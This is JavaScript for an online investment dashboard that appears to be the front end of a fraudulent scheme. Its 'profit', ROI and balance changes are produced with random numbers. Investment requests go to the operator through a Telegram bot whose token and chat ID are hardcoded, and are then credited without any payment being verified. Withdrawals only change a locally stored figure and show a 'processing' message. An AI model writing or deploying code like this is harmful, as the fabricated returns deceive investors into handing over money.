document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot Configuration
    const BOT_TOKEN = '7775599479:AAHLH8B0nOFE77LeLVSg4QoRY5YI62GCK3M';
    const CHAT_ID = '6300694007';

    // DOM Elements
    const usernameDisplay = document.getElementById('usernameDisplay');
    const currentBalance = document.getElementById('currentBalance');
    const profitStatus = document.getElementById('profitStatus');
    const activeTrades = document.getElementById('activeTrades');
    const dailyProfit = document.getElementById('dailyProfit');
    const totalROI = document.getElementById('totalROI');
    const investBtn = document.getElementById('investBtn');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const modals = document.querySelectorAll('.modal');
    const closeModalBtns = document.querySelectorAll('.close-modal');
    const withdrawAmount = document.getElementById('withdrawAmount');
    const passcode = document.getElementById('passcode');
    const confirmWithdraw = document.getElementById('confirmWithdraw');
    const resetPinLink = document.getElementById('resetPinLink');
    const planInvestBtns = document.querySelectorAll('.plan-invest-btn');
    const investOptions = document.querySelectorAll('.invest-btn');
    const transactionsTable = document.getElementById('transactionsTable').getElementsByTagName('tbody')[0];
    const investmentAmount = document.getElementById('investmentAmount');
    const approveBtn = document.getElementById('approveBtn');
    const declineBtn = document.getElementById('declineBtn');
    const approvalStatus = document.getElementById('approvalStatus');

    // User data
    let user = {
        name: 'Investor',
        balance: 0,
        pin: null,
        investments: [],
        transactions: []
    };

    // Initialize dashboard
    function initDashboard() {
        // Load user data from localStorage if available
        const savedUser = localStorage.getItem('bbcInvestmentUser');
        if (savedUser) {
            user = JSON.parse(savedUser);
        } else {
            // Default user data
            user = {
                name: 'Investor',
                balance: 0,
                pin: null,
                investments: [],
                transactions: []
            };
            saveUserData();
        }

        updateUI();
        simulateTrading();
    }

    // Update UI with user data
    function updateUI() {
        usernameDisplay.textContent = user.name;
        currentBalance.textContent = `$${user.balance.toFixed(2)} / ₦${(user.balance * 1000).toFixed(0)}`;
        
        // Calculate profit (simulated)
        const profit = user.balance > 0 ? (Math.random() * 0.05 * user.balance) : 0;
        const profitPercent = user.balance > 0 ? (profit / user.balance * 100) : 0;
        
        profitStatus.textContent = `${profit >= 0 ? '+' : ''}${profit.toFixed(2)} (${profitPercent.toFixed(2)}%) Today`;
        profitStatus.style.color = profit >= 0 ? '#28a745' : '#dc3545';
        
        activeTrades.textContent = user.investments.length;
        dailyProfit.textContent = `$${profit.toFixed(2)}`;
        totalROI.textContent = `${profitPercent.toFixed(2)}%`;
        
        updateTransactionsTable();
    }

    // Simulate trading activity
    function simulateTrading() {
        if (user.investments.length > 0) {
            // Randomly update balance to simulate market fluctuations
            setInterval(() => {
                const fluctuation = (Math.random() * 0.02 - 0.01) * user.balance;
                user.balance += fluctuation;
                
                // Ensure balance doesn't go negative
                if (user.balance < 0) user.balance = 0;
                
                saveUserData();
                updateUI();
            }, 5000);
        }
    }

    // Update transactions table
    function updateTransactionsTable() {
        transactionsTable.innerHTML = '';
        
        if (user.transactions.length === 0) {
            const row = transactionsTable.insertRow();
            const cell = row.insertCell(0);
            cell.colSpan = 5;
            cell.textContent = 'No investment history yet';
            cell.style.textAlign = 'center';
            cell.style.padding = '2rem';
            cell.style.color = '#6c757d';
            return;
        }
        
        // Sort transactions by date (newest first)
        const sortedTransactions = [...user.transactions].sort((a, b) => new Date(b.date) - new Date(a.date));
        
        sortedTransactions.forEach(transaction => {
            const row = transactionsTable.insertRow();
            
            const dateCell = row.insertCell(0);
            dateCell.textContent = new Date(transaction.date).toLocaleDateString();
            
            const planCell = row.insertCell(1);
            planCell.textContent = transaction.plan;
            
            const amountCell = row.insertCell(2);
            amountCell.textContent = `$${transaction.amount}`;
            
            const statusCell = row.insertCell(3);
            statusCell.textContent = transaction.status;
            statusCell.className = `status-${transaction.status.toLowerCase()}`;
            
            const returnsCell = row.insertCell(4);
            if (transaction.status === 'Completed') {
                const returns = transaction.returns || transaction.amount * (1 + Math.random());
                returnsCell.textContent = `$${returns.toFixed(2)}`;
                returnsCell.style.color = '#28a745';
            } else if (transaction.type === 'withdrawal') {
                returnsCell.textContent = '--';
                returnsCell.style.color = '#6c757d';
            } else {
                returnsCell.textContent = 'Pending';
                returnsCell.style.color = '#6c757d';
            }
        });
    }

    // Save user data to localStorage
    function saveUserData() {
        localStorage.setItem('bbcInvestmentUser', JSON.stringify(user));
    }

    // Modal functions
    function openModal(modalId) {
        closeAllModals();
        document.getElementById(modalId).style.display = 'block';
    }

    function closeAllModals() {
        modals.forEach(m => m.style.display = 'none');
        // Clear form fields and errors
        withdrawAmount.value = '';
        passcode.value = '';
        approvalStatus.textContent = '';
    }

    // Event Listeners
    investBtn.addEventListener('click', () => openModal('investmentModal'));
    withdrawBtn.addEventListener('click', () => {
        if (!user.pin) {
            alert('Please set your 4-digit security PIN first');
            return;
        }
        openModal('withdrawalModal');
    });
    
    logoutBtn.addEventListener('click', () => {
        localStorage.removeItem('bbcInvestmentUser');
        window.location.href = 'login.html'; // Redirect to login page
    });

    closeModalBtns.forEach(btn => {
        btn.addEventListener('click', closeAllModals);
    });

    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal')) {
            closeAllModals();
        }
    });

    // Withdrawal functionality
    confirmWithdraw.addEventListener('click', () => {
        const amount = parseFloat(withdrawAmount.value);
        const pin = passcode.value;
        
        if (isNaN(amount) || amount < 100) {
            alert('Minimum withdrawal amount is $100');
            return;
        }
        
        if (amount > user.balance) {
            alert('Insufficient balance for this withdrawal');
            return;
        }
        
        if (!pin || pin !== user.pin) {
            alert('Incorrect PIN. Please try again.');
            return;
        }
        
        // Process withdrawal
        user.balance -= amount;
        user.transactions.push({
            date: new Date(),
            plan: 'Withdrawal',
            amount: amount,
            status: 'Processing',
            type: 'withdrawal'
        });
        
        saveUserData();
        updateUI();
        alert(`Withdrawal request for $${amount.toFixed(2)} has been submitted. Processing may take 1-3 business days.`);
        closeAllModals();
    });

    // Investment functionality
    planInvestBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            const amount = parseFloat(e.target.getAttribute('data-amount'));
            initiateInvestment(amount);
        });
    });

    investOptions.forEach(option => {
        option.addEventListener('click', (e) => {
            const amount = parseFloat(e.target.closest('.option-card').getAttribute('data-amount'));
            initiateInvestment(amount);
        });
    });

    function initiateInvestment(amount) {
        investmentAmount.textContent = `$${amount}`;
        openModal('approvalModal');
        
        // Store the pending investment
        localStorage.setItem('pendingInvestment', JSON.stringify({
            amount: amount,
            timestamp: new Date().getTime()
        }));
    }

    // Approval Button Handler
    approveBtn.addEventListener('click', function() {
        const pendingInvestment = JSON.parse(localStorage.getItem('pendingInvestment'));
        if (!pendingInvestment) return;
        
        const amount = pendingInvestment.amount;
        approvalStatus.textContent = 'Processing approval...';
        approvalStatus.style.color = '#007bff';
        
        // Send to Telegram bot
        const message = `💰 New Investment Request\n\n` +
                       `Amount: $${amount}\n` +
                       `User: ${user.name}\n` +
                       `Balance: $${user.balance.toFixed(2)}\n` +
                       `Time: ${new Date().toLocaleString()}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        fetch(telegramUrl)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Add to balance after approval
                    user.balance += amount;
                    
                    // Record transaction
                    user.transactions.push({
                        date: new Date(),
                        plan: getPlanName(amount),
                        amount: amount,
                        status: 'Active',
                        type: 'investment'
                    });
                    
                    // Add to investments
                    user.investments.push({
                        amount: amount,
                        date: new Date(),
                        plan: getPlanName(amount)
                    });
                    
                    saveUserData();
                    updateUI();
                    approvalStatus.textContent = 'Payment approved! Trading has started.';
                    approvalStatus.style.color = '#28a745';
                    
                    setTimeout(() => {
                        closeAllModals();
                    }, 2000);
                } else {
                    approvalStatus.textContent = 'Approval failed. Please try again.';
                    approvalStatus.style.color = '#dc3545';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                approvalStatus.textContent = 'Error sending approval request.';
                approvalStatus.style.color = '#dc3545';
            });
        
        localStorage.removeItem('pendingInvestment');
    });

    // Decline Button Handler
    declineBtn.addEventListener('click', function() {
        localStorage.removeItem('pendingInvestment');
        closeAllModals();
        alert('Investment request cancelled.');
    });

    function getPlanName(amount) {
        if (amount === 10) return 'Basic Plan';
        if (amount === 50) return 'Standard Plan';
        if (amount === 100) return 'Premium Plan';
        if (amount === 200) return 'VIP Plan';
        return 'Custom Plan';
    }

    // Initialize the dashboard
    initDashboard();
});
